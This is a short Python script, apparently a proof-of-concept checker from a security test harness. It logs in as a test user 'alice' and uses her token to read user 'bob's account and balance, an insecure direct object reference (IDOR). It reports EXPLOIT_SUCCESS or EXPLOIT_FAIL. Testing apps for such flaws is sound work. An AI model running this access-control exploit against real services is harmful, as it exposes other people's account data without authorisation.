import os
import sys
import requests

BASE_URL = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def main():
    # Step 1: Authenticate as alice
    try:
        login_resp = requests.post(
            f'{BASE_URL}/api/auth/login',
            json={'username': 'alice', 'password': 'alice-pw'},
            timeout=5
        )
    except Exception as e:
        print(f'EXPLOIT_FAIL: login request error — {e}')
        sys.exit(0)

    if login_resp.status_code != 200:
        print(f'EXPLOIT_FAIL: login failed with status {login_resp.status_code}')
        sys.exit(0)

    token = login_resp.json().get('token')
    if not token:
        print('EXPLOIT_FAIL: no token in login response')
        sys.exit(0)

    # Step 2: Use alice's token to access bob's account (IDOR)
    try:
        idor_resp = requests.get(
            f'{BASE_URL}/api/account/bob',
            headers={'Authorization': f'Bearer {token}'},
            timeout=5
        )
    except Exception as e:
        print(f'EXPLOIT_FAIL: IDOR request error — {e}')
        sys.exit(0)

    if idor_resp.status_code == 200:
        data = idor_resp.json()
        acct_id = data.get('id', '')
        balance = data.get('balance', '')
        if str(acct_id).lower() == 'bob':
            print(f"EXPLOIT_SUCCESS: alice's token read bob's account — id={acct_id} balance={balance}")
        else:
            print(f'EXPLOIT_FAIL: unexpected account data returned — {data}')
    elif idor_resp.status_code == 403:
        print('EXPLOIT_FAIL: server returned 403 — ownership check is enforced')
    elif idor_resp.status_code == 401:
        print('EXPLOIT_FAIL: server returned 401 — token rejected')
    else:
        print(f'EXPLOIT_FAIL: unexpected status {idor_resp.status_code} — {idor_resp.text[:200]}')

    sys.exit(0)

if __name__ == '__main__':
    main()

